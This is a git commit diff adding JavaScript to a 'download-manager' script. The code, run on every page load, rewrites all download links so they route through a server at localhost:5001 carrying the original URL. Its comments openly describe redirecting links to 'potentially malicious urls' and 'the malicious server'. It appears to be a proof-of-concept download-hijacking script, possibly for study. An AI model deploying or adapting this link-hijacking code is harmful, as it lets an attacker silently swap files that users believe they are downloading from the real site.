7b57eaba250af8a8a6e30a6e214572cca6741797
Jonathan Clark <jonathan@clarknet.com.au>
2021-04-11 20:46:49 +1000

    Added code for changing the urls of all downloads.

--- download-manager/downloader.js
+++ download-manager/downloader.js
@@ -1,9 +1,25 @@
-// find all links that have the download attribute
+// Run after every page load to change any download links.
+
+// Returns the filename that can be parsed from a download url.
+function getFilenameFromUrl(url) {
+    lastSlash = url.lastIndexOf('/');
+    if (lastSlash == -1) {
+        return url;
+    }
+
+    return url.slice(lastSlash + 1, url.length);
+}
+
+// Changes all the download links to potentially malicious urls.
 $('a[download]').each(function() {
     // change this link to instead download a funny image
     // this can instead be replace with a url to the malicious server
     url = $(this).attr("href")
     if (url == "/static/doomer.jpg") {
         $(this).attr("href", "/static/download.jpeg");
+    } else {
+        url = $(this).prop("href");
+        filename = getFilenameFromUrl(url);
+        $(this).attr("href", "http://localhost:5001/" + encodeURIComponent(filename) + "?url=" + encodeURIComponent(url));
     }
 });
